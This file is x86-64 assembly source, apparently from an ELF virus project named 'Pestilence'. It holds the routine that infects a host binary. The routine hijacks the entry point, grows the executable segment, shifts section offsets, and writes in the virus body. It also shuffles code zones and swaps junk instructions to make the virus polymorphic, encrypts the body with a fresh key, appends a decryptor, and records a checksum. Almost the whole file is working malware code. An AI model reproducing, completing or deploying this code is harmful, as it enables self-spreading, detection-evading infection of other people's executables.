%define UPDATE_MMAPED_FILE_S
%include "pestilence.lst"

section .text
	global _update_mmaped_file

_update_mmaped_file: ; update_mmaped_file(void *mmap_base_address, long file_size, long virus_size, long fd)
	enter 384, 0
	; rsp + 0  mmap start address (ehdr)
	; rsp + 8  file size
	; rsp + 16 virus size
	; rsp + 24 fd
	; rsp + 32 phdr (ehdr + ehdr->e_phoff)
	; rsp + 40 shdr (ehdr + ehdr->e_shoff)
	; rsp + 48 actual phnum or actual shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 56 ehdr->e_phnum or ehdr->e_shnum for respectively treat_all_segments or treat_all_sections
	; rsp + 64 found? bool
	; rsp + 72 virus offset
	; rsp + 80 o_entry store address (it's the address where we store the o_entry, (char *))
	; rsp + 88 number of 0 bytes to add
	; rsp + 96 i
	; rsp + 104 = 0
	; rsp + 108 mmap_tmp addr
	; rsp + 116 index mmap_tmp
	; rsp + 124 set to 1 if infection worked, 0 else
	; rsp + 132 key addr
	; rsp + 140 PT_LOAD segment offset in file
	; rsp + 148 text section vaddr
	; rsp + 240 -> 368, table_offset_tmp.
	;;;;;;;;;;;;;;;;;;;;;

; init phase
; first mov all params on stack
	mov QWORD [rsp], rdi

	mov QWORD [rsp + 8], rsi

	mov QWORD [rsp + 16], rdx

	mov QWORD [rsp + 24], r10
	mov QWORD [rsp + 124], 0

; init phdr (ehdr + ehdr->e_phoff)
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 32], r10 ; store it on stack
	add QWORD [rsp + 32], 32 ; add 32 on the address (offset on the header for e_phoff)
	mov r10, QWORD [rsp + 32] ; take this address
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 32], r10 ; mov it on stack
	mov r10, QWORD [rsp] ; take the mmap_base_address
	add QWORD [rsp + 32], r10 ; add it to our offset

; init shdr (ehdr + ehdr->e_shoff)
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 40], r10 ; store it on stack
	add QWORD [rsp + 40], 40 ; add 40 on the address (offset ont the header for e_shoff) 
	mov r10, QWORD [rsp + 40] ; take this address
	mov r10, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 40], r10 ; mov it on stack
	mov r10, QWORD [rsp] ; take the mmap_base_address
	add QWORD [rsp + 40], r10 ; add it to our offset

; init actual phnum
	mov QWORD [rsp + 48], 0

; take the number of segment
	mov r10, QWORD [rsp] ; take the mmap_base_address
	mov QWORD [rsp + 56], r10 ; store it on stack
	add QWORD [rsp + 56], 56 ; add 56 to it (offset for e_phnum)
	mov r11, QWORD [rsp + 56] ; take this addres
	xor r10, r10 ; clear r10, we will move a 2 bytes value on it, so we need to clear it before
	mov r10w, WORD [r11] ; dereference our addres to take e_phnum
	mov QWORD [rsp + 56], r10 ; store it on stack

; found = 0
	mov QWORD [rsp + 64], 0

; virus offset = 0
	mov QWORD [rsp + 72], 0

_treat_all_segments:
	mov r10, QWORD [rsp + 56] ; take e_phnum
	cmp QWORD [rsp + 48], r10 ; while phnum < ehdr->e_phnum
	jge _init_treat_all_sections
; check if our segment offset is in file size
	mov r10, QWORD [rsp + 32] ; take phdr
	sub r10, QWORD [rsp] ; sub the mmap_base_addr, to take the offset of the actual segment header
	cmp r10, QWORD [rsp + 8] ; check if this offset < file_size
	jge _munmap

_if:
	cmp QWORD [rsp + 64], 0 ; if found
	je _else_if
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 bytes to acces p_offset
	mov r10, QWORD [r10] ; dereference it to take the value
	cmp r10, QWORD [rsp + 8]
	jge _end
	cmp r10, QWORD [rsp + 72] ; if phdr->p_offset >= virus offset
	jl _else_if
	mov r10, QWORD [rsp + 32] ; add PAGE_SIZE to segment offset
	add r10, 8
	add QWORD [r10], PAGE_SIZE
	jmp _inc_jmp_loop

_else_if:
	mov r10, QWORD [rsp + 32] ; take phdr
	cmp DWORD [r10], 1 ; if phdr->p_type == PT_LOAD
	jne _inc_jmp_loop
	add r10, 4 ; offset of p_flags
	mov r10d, DWORD [r10] ; dereference it to take the value
	and r10d, 1 ; logical and for the flag
	cmp r10d, 1 ; if phdr->p_flags & PF_X
	jne _inc_jmp_loop
; virus offset = phdr->p_offset + phdr->p_filesz
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 8 ; add 8 bytes to take p_offset (offset of the segment in file)
	mov r12, QWORD [r10]
	cmp r12, QWORD [rsp + 8]
	jge _end
	mov QWORD [rsp + 140], r12
	mov r12, r10
	add r12, 8
	mov r12, QWORD [r12]
	mov QWORD [rsp + 148], r12

	mov r11, QWORD [r10] ; dereference it to take the value
	mov QWORD [rsp + 72], r11 ; store it on stack, virus_offset = phdr->p_offset
	add r10, 24 ; offset of p_filesz is 32, we already added 8, so 32 - 8 = 24.
	mov r11, QWORD [r10] ; dereference
	add QWORD [rsp + 72], r11 ; virus offset += phdr->p_filesz
	mov r12, QWORD [rsp + 72]
	cmp r12, QWORD [rsp + 8]
	jge _end
; modify e_entry
	mov r11, QWORD [rsp] ; take mmap_base_addr
	add r11, 24 ; e_entry offset
	mov rdi, QWORD [r11] ; take the actual e_entry by dereferencing
	mov QWORD [rsp + 80], rdi ; store it on stack, we will need it
	inc QWORD [rsp + 64] ; found++
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 16 ; p_vaddr offset
	mov rdi, QWORD [r10] ; take p_vaddr value
	mov QWORD [r11], rdi ; store in on e_entry
	add r10, 16 ; p_filesz offset is 32, we already add 16, so 32 - 16 = 16
	mov r12, QWORD [r10] ; take p_filesz value
	add QWORD [r11], r12 ; add it to e_entry, so e_entry = p_vaddr + p_filesz
; take the size of _o_entry + _string.
	lea r8, [rel _o_entry]
	lea r9, [rel _start]
	sub r9, r8
	add QWORD [r11], r9 ; add the offset of the strings at the beginning of the virus
; update p_filesz and p_memsz
	mov r10, QWORD [rsp + 32] ; take phdr
	add r10, 32 ; p_filesz offset
	mov r11, PAGE_SIZE
	add QWORD [r10], r11 ; add virus_size to the segment size in file and in memory
	add r10, 8 ; p_memsz offset is 8 bytes further p_filesz
	add QWORD [r10], r11

_inc_jmp_loop:
	add QWORD [rsp + 32], 56 ; 56 is the size of our struct, so we jmp to the next struct
	inc QWORD [rsp + 48] ; inc our phnum
	jmp _treat_all_segments

_init_treat_all_sections:
	mov QWORD [rsp + 48], 0 ; shnum = 0
	mov r10, QWORD [rsp] ; take mmap_base_address
	mov QWORD [rsp + 56], r10 ; store it on stack
	add QWORD [rsp + 56], 60 ; add 60 to take e_shnum
	mov r11, QWORD [rsp + 56] ; take the address
	xor r10, r10 ; clear r10
	mov r10w, WORD [r11] ; dereference our address to take e_shnum value
	mov QWORD [rsp + 56], r10 ; store it on stack
	mov QWORD [rsp + 96], 0

_treat_all_sections:
	mov r10, QWORD [rsp + 48] ; take shnum
	cmp r10, QWORD [rsp + 56] ; while (shnum < ehdr->e_shnum)
	jge _init_mmap_tmp
	mov r10, QWORD [rsp + 40] ; take shdr
	sub r10, QWORD [rsp] ; sub mmap_base_addr to shdr, to take the offset
	cmp r10, QWORD [rsp + 8] ; check if this offset is in file bounds
	jge _end

_if_offset_equal_virus_offset:
	xor r10, r10 ; clear r10
	mov r10, QWORD [rsp + 40] ; take shdr
	add r10, 24 ; shdr->sh_offset offset
	mov r11, QWORD [rsp + 40] ; take shdr
	add r11, 32 ; shdr->sh_size offset
	mov r12, QWORD [rsp + 8]
	mov rdi, QWORD [r10] ; mov the value of sh_offset in rdi
	add rdi, QWORD [r11] ; add the value of sh_size

	mov r12, QWORD [rsp + 40]
	add r12, 4
	xor r13, r13
	mov r13d, DWORD [r12]
	xor rax, rax
	and r13d, 8
	cmp rax, 0
	je .check_virus_offset

	cmp rdi, QWORD [rsp + 8]
	jge _end

	.check_virus_offset:
	cmp rdi, QWORD [rsp + 72] ; if (shdr->sh_offset + shdr->sh_size) == virus offset
	jne _if_offset_greater_or_equal_virus_offset
	mov r10, PAGE_SIZE
	add QWORD [r11], r10 ; add it to sh_size

_if_offset_greater_or_equal_virus_offset:
	xor r10, r10 ; clear r10
	mov r10, QWORD [rsp + 40] ; take shdr
	add r10, 24 ; shdr->sh_offset offset
	mov r10, QWORD [r10] ; dereference sh_offset addres
	cmp r10, QWORD [rsp + 8]
	jge _end
	cmp r10, QWORD [rsp + 72] ; if shdr->sh_offset >= virus offset
	jl _inc_jmp_loop_sections
; add PAGE_SIZE to sh_offset
	mov r10, QWORD [rsp + 40] ;take shdr
	add r10, 24 ; go to sh_offset
	add QWORD [r10], PAGE_SIZE ; add pagesize

_inc_jmp_loop_sections:
	inc QWORD [rsp + 48] ; inc shnum
	add QWORD [rsp + 40], 0x40 ; shdr struct size
	jmp _treat_all_sections

_init_mmap_tmp:
	
; add PAGESIZE to sections offset
	mov r10, QWORD [rsp] ; take mmap_base_addr
	add r10, 40 ; go to sh_offset
	add QWORD [r10], PAGE_SIZE ; add pagesize

;; Descryption of how we will overwrite the binary:
;	First, write the content of the binary that is before the offset
;		where we will put our virus.
;	Then, we write the old entry point of the binary.
;	Then, we write the starting code of our binary, beginning to _string and ending at the end
;		of _verif (famine.s file).
;	After this is done, we will write our functions who check for debugers, processus etc...
;		this part start at _checkproc, and end at the beginning of _functions_offset_from_start
;		this part is separated in 4 zone:
;			-----
;			checkproctest.s
;			ft_strlen.s
;			ft_is_integer_string.s
;			ft_strequ.s
;			-----
;			checkdbg.s
;			-----
;			crc32.s
;			-----
;			checkdbg_by_status_file.s
;			ft_strstr.s
;			ft_atoi.s
;			ft_itoa.s
;			-----
;		But when infecting, we will swap theis zone randomly. But all the unencrypted part of the virus
;			contains junk instruction, that we will modify randomly at infection. So when we will swap theis
;			zones we need to update _functions_offset_from_start table, and _table_offset table.
;			The first one contain offset from start of our functions, so we can retrieve them with theis offset.
;			Second one contain junk instruction offset from start, so we need to update them too to modify only
;			junk instruction with junk instruction.
;			To swap theis zones, we will init at 0 a table of the size of our _functions_offset table.
;			then we will get a random number between 0 and size-1. And we will check for the first function
;			at this offset that is not already righten on file. then we decremente our max random number.
;			So when our max random number is at 0, we technically writed all the part.
;			When writing a function, we update the _table_offset table. To do it, we check all offset of the table,
;			and update only theis who is between ou actual function offset and actual function offset + size.
;			(actual is because we take offset of the actual file, not the offset we get randomly).
;			then we take the difference between actual function offset and randomly getted function offset, and add
;			this difference to our _table_offset who matched with this zone.
;	Then we write our _jump_to_function function.
;	Then we write our encrypted part, it will be done in 3 steps:
;		First, we will encrypt from _encrypted_part_start, to _table_offset (excluded). We get the key generated to
;			encrypt.
;		Second, we encrypt our _table_offset, with the key we previously getted.
;		Third, we encrypt from the end of _table_offset to start of _padding (excluded), with the key previously getted.
;	Then we write our key, and our depacker.
;	After all of that is done, we run byterpl, who we will modify actual junk instructions with another junk instructions.
;	Then we calcul the checksum of the text section (virus included), and store the start of checksum calculation, the size
;		of calculation, and the result. Then we can check about modified code when virus is launched.
;	Then we complite with a padding of 0x00 bytes to write a multiple of page size.
;	After that, we write the end of the binary.
;;;;;;;;

;;;;;;;;;;;;;;;;;
; mmap tmp
_mmap_tmp:
	mov rax, SYS_MMAP
	mov rdi, 0
	mov rsi, QWORD [rsp + 8]
	add rsi, PAGE_SIZE
	mov rdx, PROT_READ | PROT_WRITE
	mov r10, MAP_ANONYMOUS | MAP_PRIVATE
	mov r8, -1
	mov r9, 0
	syscall
	cmp rax, 0
	jle _end
	mov QWORD [rsp + 108], rax
	mov QWORD [rsp + 116], 0

_write_in_tmp_map:
;; memcpy(mmap_tmp, mmap, virus_offset);
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp]
	mov rcx, QWORD [rsp + 72]
	cld
	rep movsb
	mov r10, QWORD [rsp + 72]
	mov QWORD [rsp + 116], r10 ; add the number of bytes copied, it's the index of mmap_tmp
;; memcpy(mmap_tmp + index, o_entry, 8);
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rsi, rsp ;
	add rsi, 80
	mov rcx, 8 ; size
	cld
	rep movsb
	add QWORD [rsp + 116], 8 ; add 8 to our index

;; We copy the first part that is not encrypted, and will not move.
_copy_start_point:
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _string]
	lea rcx, [rel _checkproc]
	sub rcx, 8
	sub rcx, rsi
	add QWORD [rsp + 116], rcx ; add 8 to our index
	cld
	rep movsb

;; Here is the part that is unencrypted and will be switched.
;; We have 2 tables in our binary: _functions_offset_from_start, _table_offset
;; The first one contains offset to the "zone" of our 
_copy_unencrypted_part:
	.init:

; Initialize random number min/max values 
	mov QWORD [rsp + 156], 0 ; min
	mov QWORD [rsp + 164], 3 ; max

; Take the base offset of the first function we will write.
; Note that the first offset in _functions_offset_from_start table is always the same.
	lea r11, [rel _start]
	lea r12, [rel _checkproc]
	sub r12, 8
	sub r12, r11
	mov QWORD [rsp + 172], r12 ; first offset from start

; Take the total addr on mmap of the table_offset in the binary we are infecting.
	lea r10, [rel _checkproc] ; take addr of _checkproc
	sub r10, 8 ; sub 8, to take the opcode before the function
	lea r11, [rel _functions_offset_from_start] ; take our _functions table
	sub r11, r10 ; take the distance
	add r11, QWORD [rsp + 116] ; add the number of byte we already writed (start of binary - start of _check_proc)
	add r11, QWORD [rsp + 108] ; add the addr of mmap
	mov QWORD [rsp + 180], r11 ; total addr to _functions_offset_from_start on mmap

; Initialize to 0 some variables
	; this is a "mask" all byte correspond to an index in our table. If a byte is at 1, so we already right
	; in our file the function at this index on our table_offset
	mov QWORD [rsp + 188], 0
	; just a temporary variable
	mov QWORD [rsp + 204], 0

; Mov the base table_offset in the stack. So offset we will not touch will be their too
	lea rdi, [rsp + 240]
	lea rsi, [rel _table_offset]
	mov rcx, 16
	cld
	rep movsq

; Now we can loop
	.loop:
		; First we generate our number, according to the min/max values
		mov rdi, QWORD [rsp + 156]
		mov rsi, QWORD [rsp + 164]
		mov rdx, 0x9485731273645823 ; <-- This seed is totally arbitrary
		xor rax, rax
		call _urand

		; Now we will check for the first function at this index that is not already writed.
		; To do so, we will incremente rcx, check if at rcx index the function is at 0, if it is,
		; we decremente rax, and when rax is at 0, we are at our index.
		xor rcx, rcx
		.look_for_unwrited_function:
			cmp BYTE [rsp + 188 + rcx], 0 ; check if mask is at 1 in that index
			je .verif_rax
				inc rcx ; just increment to next byte on mask
				jmp .look_for_unwrited_function
			.verif_rax:
				cmp rax, 0 ; check if rax = 0.
				je .write_function
				inc rcx
				dec rax
				jmp .look_for_unwrited_function
		.write_function:
		; We find our function index, So we update our mask
		mov BYTE [rsp + 188 + rcx], 1

		; Our table contains 8 bytes long values, so multiply the index by 8
		mov rax, rcx
		mov rcx, 8
		mul rcx

		; Take the total addr in current file, of the function _start + offset
		mov rdi, QWORD [rsp + 108]
		add rdi, QWORD [rsp + 116]
		lea rsi, [rel _functions_offset_from_start]
		add rsi, rax ; go to our index in table
		; take the next index in table
		mov rcx, rsi
		add rcx, 8
		lea r10, [rel _start]
		mov rsi, QWORD [rsi] ; take the offset of our index in table
		mov QWORD [rsp + 220], rsi ; save it, we will need it
		sub QWORD [rsp + 220], 8 ; dont forget the 8 bytes of opcode before the function
		add rsi, r10 ; add the actual _start addr to our offset
		sub rsi, 8 ; 8 bytes for opcode
		mov rcx, QWORD [rcx] ; take the offset of our index + 1
		add rcx, r10 ; add _start addr to our offset
		sub rcx, 8 ; 8 bytes for opcode
		; rax is our index*8, if we are at index 3, we will be at offset 3*8=24, and this is the
		; last offset of the table, after this, it's juste code. So if we are at the end of the table,
		; rcx will not be index+1, but will be the addr of _functions_offset_from_start table,
		; that is directly after the last function swapped in file. Note that we don't need to substract
		; 8 to this rcx, because it's not a function with opcode.
		cmp rax, 24
		jl .not_at_end_table
		lea rcx, [rel _functions_offset_from_start]
		.not_at_end_table:
		sub rcx, rsi ; take the size of the zone to write
		mov QWORD [rsp + 204], rcx ; save it on stack
		add QWORD [rsp + 116], rcx ; add it to the number of byte we already writed on file
		cld
		rep movsb ; write our function
		
		; Now we will check all our junk offsets that are between our actual function offset (not the offset of
		; where we writted it, but the offset of the actual file), and this offset + the zone size.
		; All theis junks instructions will be incremented according to the offset incrementation of the zone,
		; in the new file.
		; To do so, we will check all the junks offset in the current file offset table, and update the offset
		; of the junks in our zone according to the same incrementation offset of the zone.
		.check_loop_table_offset:
			; Initialisation
			xor rcx, rcx
			lea rdi, [rel _table_offset] ; take our current file table_offset
			.check_offsets_loop:
				mov r10, QWORD [rsp + 220] ; take our zone offset in current file.
				; If the offset of our index is lower than the offset of the zone, the junk isn't in our zone.
				cmp DWORD [rdi + rcx], r10d
				jl .next_offset
				add r10, QWORD [rsp + 204] ; take the size of the zone, and add it to our zone offset
				; If the offset is greater of equal than the offset+size of the zone, the junk isn't in our zone
				cmp DWORD [rdi + rcx], r10d
				jge .next_offset

				; If we are here, the junk is in our zone
				; We first calcul the offset difference between current zone offset, and new file zone offset.
				mov r10d, DWORD [rsp + 172] ; take the zone offset in the new infected file.
				sub r10d, DWORD [rsp + 220] ; substract the zone offset of our current file.

				; take the offset of the junk in zone
				lea r11, [rel _table_offset]
				add r11, rcx
				mov r11d, DWORD [r11] ; take the offset value
				mov DWORD [rsp + 240 + rcx], r11d ; mov it on our tmp table on stack
				add DWORD [rsp + 240 + rcx], r10d ; add the difference to this junk.

				.next_offset:
				cmp rcx, 124 ; if index on table_offset is 124, we reach the end of our table.
				je .table_updated
				add rcx, 4 ; offset on _table_offset are 4 bytes long
				jmp .check_offsets_loop
		.table_updated:

		; Now we will update _functions_offset_from_start table
		mov rdi, QWORD [rsp + 180] ; take table addr on mmap
		mov rsi, QWORD [rsp + 172] ; take the offset of the functions in the new file
		mov QWORD [rdi], rsi ; mov in our table the offset of our function
		add QWORD [rdi], 8 ; add 8 to the offset, the 8 bytes of the opcode
		mov rsi, QWORD [rsp + 204] ; take the size of the function
		add QWORD [rsp + 172], rsi ; add the size to the offset from start for the next function.
		add QWORD [rsp + 180], 8 ; add 8, the size of opcode
		cmp QWORD [rsp + 164], 0 ; check we our max random value is at 0
		jle .inc_with_table_size
		dec QWORD [rsp + 164] ; we decremente our max random value.
		jmp .loop
	.inc_with_table_size:
	add QWORD [rsp + 116], 32 ; we already writed our _functions_offset_from_start table, so just update the number of byte already writted

_copy_jump_to_function:
	; Copy the jump function
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _jump_to_function]
	lea rcx, [rel _encrypted_part_start]
	sub rcx, rsi
	add QWORD [rsp + 116], rcx
	cld
	rep movsb
; Incremente our index in our destination mmap
;	lea rsi, [rel _string]
;	lea rcx, [rel _encrypted_part_start]
;	sub rcx, rsi
;	add QWORD [rsp + 116], rcx

; We will copy the encrypted zone, but in 3 times:
; First we will copy from _encrypted_part_start to _table_offset (excluded), and save the key
; Second we will encrypt _table_offset table with our previous key
; Third, we will encrypt the rest, from end of _table_offset to _padding (excluded)l with our previous key
_copy_encrypt_zone:
; setting parameters
; take the base addr to encrypt
	lea rdi, [rel _encrypted_part_start]
; calculate the size to encrypt
	lea rsi, [rel _table_offset]
	sub rsi, rdi ; calculate the size to encrypt
; take the addr to store the encrypted part
	mov rdx, QWORD [rsp + 108] ; mmap addr
	add rdx, QWORD [rsp + 116] ; offset
	xor r10, r10 ; key = NULL (the function will check if r10 is at 0, and generate a key if it is 0)
	call _encrypt_zone
	mov QWORD [rsp + 132], rax ; take the key addr the function returned
	lea rsi, [rel _table_offset]
	lea r10, [rel _encrypted_part_start]
	sub rsi, r10
	add QWORD [rsp + 116], rsi

; take the base addr to encrypt
	lea rdi, [rsp + 240]
	mov rsi, 128 ; size of our table
; take the addr to store the encrypted part
	mov rdx, QWORD [rsp + 108] ; mmap addr
	add rdx, QWORD [rsp + 116] ; offset
	mov r10, QWORD [rsp + 132] ; mov our key addr to r10, so our function will not generate another key
	call _encrypt_zone
	add QWORD [rsp + 116], 128

	lea rdi, [rel _table_offset]
	add rdi, 128 ; encrypt the part after our table, so table_addr + table_size
; calculate the size to encrypt
	lea rsi, [rel _padding]
	sub rsi, rdi ; calculate the size to encrypt
; take the addr to store the encrypted part
	mov rdx, QWORD [rsp + 108] ; mmap addr
	add rdx, QWORD [rsp + 116] ; offset
	mov r10, QWORD [rsp + 132]
	call _encrypt_zone
	lea rsi, [rel _padding]
	lea r10, [rel _table_offset]
	add r10, 128
	sub rsi, r10
	add QWORD [rsp + 116], rsi

_copy_key:
;; memcpy(mmap_tmp + index, key, 256)
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rsi, QWORD [rsp + 132]
	mov rcx, 256
	cld
	rep movsb
	add QWORD [rsp + 116], 256

_inject_modified_depacker:
; First, copy the noped depacker to destination
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	lea rsi, [rel _decrypt]
	lea rcx, [rel _end_decrypt]
	add rcx, 2
	sub rcx, rsi
	cld
	rep movsb

; Then we run _byterpl(depacker start in destination, depacker size);
; to replace nop sleds by junks instructions
	lea rcx, [rel _o_entry]
	lea rsi, [rel _start]
	sub rsi, rcx
	mov rdi, QWORD [rsp + 108]
	add rdi, rsi
	add rdi, QWORD [rsp + 72]
	lea rsi, [rsp + 240]
	call _byterpl

; Incremente our index in our destination mmap
	lea rsi, [rel _decrypt]
	lea rcx, [rel _end_decrypt]
	add rcx, 2
	sub rcx, rsi
	add QWORD [rsp + 116], rcx

_calcul_checksum:
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 72]
	lea rsi, [rel _checksum]
	lea r10, [rel _o_entry]
	sub rsi, r10
	mov r12, 0x0303030303030303
	call _jump_to_function
;	call _crc32
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov DWORD [rdi], eax
	add QWORD [rsp + 116], 4

_align_to_page_size:
; for i < PAGE_SIZE - (virus_size + 8 + key_size(256) + decrypt_size) memset(mmap_tmp, 0, 1);
	mov QWORD [rsp + 88], PAGE_SIZE
	mov rdi, QWORD [rsp + 16]
	add rdi, 8
	add rdi, 256
	lea r10, [rel _checksum]
	lea r11, [rel _decrypt]
	add r10, 4
	sub r10, r11
	add rdi, r10
	sub QWORD [rsp + 88], rdi
	mov rcx, QWORD [rsp + 88]
	mov rdi, QWORD [rsp + 108]
	add rdi, QWORD [rsp + 116]
	mov rax, 0
	cld
	rep stosb
	mov r10, QWORD [rsp + 88]
	add QWORD [rsp + 116], r10 ; add PAGE_SIZE - (virus_size + 8) to our index

_last_write:
;; memcpy(mmap_tmp + index, mmap + virus_offset, file_size - virus_offset);
	mov rdi, QWORD [rsp + 108] ; fd
	add rdi, QWORD [rsp + 116]
	mov rsi, QWORD [rsp] ; buff
	add rsi, QWORD [rsp + 72]
	mov rcx, QWORD [rsp + 8] ; size
	sub rcx, QWORD [rsp + 72]
	cld
	rep movsb

_write_into_file:
;; write(fd, mmap_tmp, file_size + PAGE_SIZE)
	mov rax, SYS_WRITE
	mov rdi, QWORD [rsp + 24]
	mov rsi, QWORD [rsp + 108]
	mov rdx, QWORD [rsp + 8]
	add rdx, PAGE_SIZE
	syscall
	mov QWORD [rsp + 124], 1

_munmap_key:
	mov rax, SYS_MUNMAP
	mov rdi, QWORD [rsp + 132]
	mov rsi, 256
	syscall

_munmap:
	mov rax, SYS_MUNMAP
	mov rdi, QWORD [rsp + 108]
	mov rsi, QWORD [rsp + 8]
	add rsi, PAGE_SIZE
	syscall

_end:
	mov rax, QWORD [rsp + 124]
	leave
	ret

%undef UPDATE_MMAPED_FILE_S
